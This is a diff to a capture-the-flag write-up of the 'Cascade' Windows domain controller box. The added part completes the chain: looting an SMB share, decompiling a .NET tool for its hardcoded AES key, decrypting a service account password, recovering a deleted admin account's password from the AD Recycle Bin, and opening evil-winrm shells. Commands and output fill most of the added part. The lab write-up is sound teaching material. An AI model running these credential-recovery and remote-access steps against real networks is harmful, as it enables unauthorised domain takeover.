@@ -2,9 +2,9 @@
 
 **OS:** Windows (Server 2008 R2, Domain Controller)
 **Difficulty:** Medium
-**Topics:** Null Session Enumeration, enum4linux, Anonymous LDAP Bind, Custom LDAP Attribute Looting (`cascadeLegacyPwd`), Base64-Encoded Credential Recovery, SMB Share Looting, TightVNC Stored-Password Recovery (fixed-key DES), evil-winrm
+**Topics:** Null Session Enumeration, enum4linux, Anonymous LDAP Bind, Custom LDAP Attribute Looting (`cascadeLegacyPwd`), Base64-Encoded Credential Recovery, SMB Share Looting, TightVNC Stored-Password Recovery (fixed-key DES), .NET Decompilation (ilspycmd), AES-CBC Credential Decryption, SQLite Looting, AD Recycle Bin / Deleted-Object Recovery, evil-winrm
 
-> **Status:** This writeup is complete up to the **`s.smith` user shell + user flag** (foothold via LDAP `cascadeLegacyPwd`, looting the `Data` share, and recovering `s.smith`'s password from a stored TightVNC registry blob). The remaining chain (`Audit$` .NET binary -> `arksvc` -> AD Recycle Bin -> root) is outlined under [Next Steps](#next-steps) but was not executed in this run.
+> **Status:** Complete chain to **root**. Foothold via anonymous LDAP (`cascadeLegacyPwd`) -> loot `Data` share -> recover `s.smith` from a stored TightVNC blob -> loot `Audit$`, decompile its .NET tool and AES-decrypt the DB to get `arksvc` -> abuse `arksvc`'s AD Recycle Bin rights to recover the deleted `TempAdmin` (= Administrator) password.
 
 ---
 
@@ -245,17 +245,118 @@ User flag captured.
 
 ---
 
-## Next Steps
+## Looting `Audit$` -> `arksvc`
 
-*Not executed in this run - documented as the intended path for when I continue the box.*
+`s.smith` (unlike `r.thompson`) can read the second non-standard share, `Audit$`. Pull it recursively:
 
-- **Loot the `Audit$` share as `s.smith`.** It holds a custom .NET tool (`CascAudit.exe`) and a SQLite database (`Audit.db`). Decompile the exe (ILSpy / dnSpy) to recover the **hardcoded AES key + IV** it uses to decrypt a password column in the DB - that yields `arksvc`'s credentials.
-- **Pivot to `arksvc`** (also in `Remote Management Users`): `evil-winrm` in, then abuse its **`AD Recycle Bin`** membership to read deleted objects:
-  ```powershell
-  Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties *
-  ```
-  The deleted **`TempAdmin`** object carries a `cascadeLegacyPwd` - Base64-decode it to get the Administrator password (the Meeting Notes breadcrumb from the `Data` share pays off here).
-- **Own the DC** as Administrator over WinRM and grab `root.txt`.
+```bash
+smbclient //10.129.84.52/Audit$ -U 'cascade.local\s.smith%sT333ve2' -c 'recurse ON; prompt OFF; mget *'
+```
+
+Contents - a custom .NET auditing tool plus its SQLite database:
+
+```
+CascAudit.exe
+CascCrypto.dll
+RunAudit.bat
+System.Data.SQLite.dll
+System.Data.SQLite.EF6.dll
+DB/Audit.db
+```
+
+### Read the database
+
+```bash
+sqlite3 Audit.db
+sqlite> .tables
+sqlite> SELECT * FROM Ldap;
+```
+
+```
+ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
+```
+
+The password column is Base64, but decoding it gives 16 bytes of **binary** - a single AES block, not cleartext. The tool decrypts it at runtime, so the key must be inside the binary.
+
+### Decompile to recover key + IV
+
+The two `.dll`/`.exe` are .NET assemblies - decompile with `ilspycmd` (or ILSpy/dnSpy/dotPeek GUI):
+
+```bash
+ilspycmd CascCrypto.dll > CascCrypto.cs
+ilspycmd CascAudit.exe  > CascAudit.cs
+```
+
+> **Version note:** the latest `ilspycmd` needs .NET 10. On .NET 6, pin an older build: `dotnet tool install -g ilspycmd --version 8.0.0.7345`. If you only need the hardcoded strings and don't want to decompile at all, `strings -el CascCrypto.dll` dumps the UTF-16 literals (the key and IV show up directly).
+
+- `CascCrypto.dll` -> `DecryptString(string, string)`: **AES-128-CBC**, with a constant **`IV = 1tdyjCbY1Ix49842`** (`DefaultIV`); key and IV are turned into bytes with `Encoding.UTF8.GetBytes`.
+- `CascAudit.exe` -> `Main` calls `Crypto.DecryptString(encryptedString, "c4scadek3y654321")`, so the **key = `c4scadek3y654321`**.
+
+### Decrypt the credential
+
+```python
+import base64
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+
+key = b"c4scadek3y654321"
+iv  = b"1tdyjCbY1Ix49842"
+enc = base64.b64decode("BQO5l5Kj9MdErXx6Q6AGOw==")
+print(unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(enc), 16).decode())
+# -> w3lc0meFr31nd
+```
+
+The raw block is `b'w3lc0meFr31nd\x03\x03\x03'` - PKCS7 padding, so `unpad` (or `rstrip` the pad bytes) gives `arksvc`'s password: **`w3lc0meFr31nd`**.
+
+### Shell as `arksvc`
+
+```bash
+evil-winrm -i 10.129.84.52 -u arksvc -p 'w3lc0meFr31nd'
+```
+
+```powershell
+whoami /groups
+```
+
+Confirms membership of **`CASCADE\AD Recycle Bin`** - exactly the group needed for the final step.
+
+---
+
+## Privilege Escalation - AD Recycle Bin -> `TempAdmin` -> root
+
+`arksvc`'s `AD Recycle Bin` membership lets it read **deleted** AD objects, which ordinary users can't. The Meeting Notes breadcrumb from the `Data` share said a `TempAdmin` account shared the real Administrator's password - and `TempAdmin` was deleted, so it's sitting in the recycle bin.
+
+```powershell
+Get-ADObject -Filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -IncludeDeletedObjects -Properties * |
+  Select-Object name, cascadeLegacyPwd
+```
+
+```
+name       cascadeLegacyPwd
+----       ----------------
+TempAdmin  YmFDVDNyMWFOMDBkbGVz
+```
+
+Same `cascadeLegacyPwd` legacy-password attribute as the foothold, same Base64 trick:
+
+```bash
+echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d
+# -> baCT3r1aN00dles
+```
+
+### Shell as Administrator
+
+Per the Meeting Notes, `TempAdmin`'s password **is** the Administrator password:
+
+```bash
+evil-winrm -i 10.129.84.52 -u administrator -p 'baCT3r1aN00dles'
+```
+
+```powershell
+type C:\Users\Administrator\Desktop\root.txt
+```
+
+Box rooted.
 
 ---
 
@@ -274,6 +375,11 @@ User flag captured.
 | Loot | Recursively download `Data`, grep the dump for secrets | smbclient + grep |
 | Cred recovery | Decrypt stored TightVNC password (fixed-key DES) | pycryptodome / vncpwd |
 | User shell | WinRM as `s.smith` -> user flag | evil-winrm |
+| Loot | Read `Audit$` SQLite DB (`Ldap` table) | smbclient + sqlite3 |
+| Reversing | Decompile .NET tool for hardcoded AES key + IV | ilspycmd / strings |
+| Cred recovery | AES-128-CBC decrypt `arksvc` password | pycryptodome |
+| Privesc | Recover deleted `TempAdmin` from AD Recycle Bin | Get-ADObject + base64 |
+| Root | WinRM as Administrator -> root flag | evil-winrm |
 
 ---
 
@@ -287,3 +393,6 @@ User flag captured.
 - **Stored VNC passwords are reversible, not hashed.** TightVNC/RealVNC/UltraVNC store the server password DES-encrypted under a *fixed* key (`e84ad660c4721ae0`). A `"Password"=hex:...` under an `HKLM\...\VNC` key - or an 8-byte blob in a `.reg`/`.ini`/`.vnc` file - is instantly recoverable with `vncpwd` or an 8-line DES decrypt. Same lesson as Base64: obfuscation is not encryption you can't reverse.
 - **After downloading a share, grep it - don't browse it.** `grep -rniE "pass|pwd|secret|cred" <loot_dir>` surfaces credentials across notes, configs, scripts and exported registry files in a single pass, far faster than opening files by hand.
 - **Not every secret is for right now.** The Meeting Notes `TempAdmin` hint is useless at foothold and decisive at root. Note breadcrumbs, map each to the account it unlocks, and come back to it when you're in range.
+- **A Base64 blob that decodes to binary is a cipher block, not a password.** `BQO5l5Kj9MdErXx6Q6AGOw==` decodes to exactly 16 bytes - one AES block. That length is the tell: the cleartext is encrypted, and whatever decrypts it (key + IV) is almost always hardcoded in the tool shipped next to the DB.
+- **Custom .NET tools carry their own keys - decompile them.** `.exe`/`.dll` found on a share are readable source: `ilspycmd` (or ILSpy/dnSpy) reveals hardcoded AES keys, IVs and connection strings. When you only need the constants, `strings -el` (UTF-16) often dumps the key and IV without decompiling at all.
+- **`AD Recycle Bin` membership = read deleted objects.** Deleted AD objects keep their attributes (including custom ones like `cascadeLegacyPwd`) until purged. `Get-ADObject -IncludeDeletedObjects -Properties *` from a member of that group is a standard privesc - always enumerate the recycle bin when you land on such an account.
